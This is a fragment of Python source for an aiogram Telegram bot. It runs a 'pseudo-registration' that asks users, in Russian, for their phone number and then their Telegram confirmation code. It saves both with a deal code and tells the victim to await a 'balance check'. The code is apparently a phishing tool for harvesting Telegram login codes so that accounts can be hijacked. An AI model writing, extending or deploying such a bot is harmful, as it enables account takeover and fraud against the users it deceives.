@router.message(PseudoReg.phone)  
async def reg_phone(msg: Message, state: FSMContext):  
    await state.update_data(phone=msg.text)  
    await state.set_state(PseudoReg.code)  
    await msg.answer("📩 Введите код подтверждения из Telegram:")  
  
@router.message(PseudoReg.code)  
async def reg_code(msg: Message, state: FSMContext):  
    data = await state.get_data()  
    save_account(data.get("deal_code"), data.get("phone"), msg.text, json.dumps({"user": msg.from_user.id}))  
    await state.clear()  
    await msg.answer("✅ Успешно! Ожидайте автоматической проверки баланса Telegram.")  

async def main():  
    db_init()  
    bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))  
    dp = Dispatcher(storage=MemoryStorage())  
    dp.include_router(router)  
    print(f"[{BRAND}] Бот полностью настроен с анимированным таймером.")  
    await dp.start_polling(bot)  

if __name__ == "__main__":  
    asyncio.run(main())
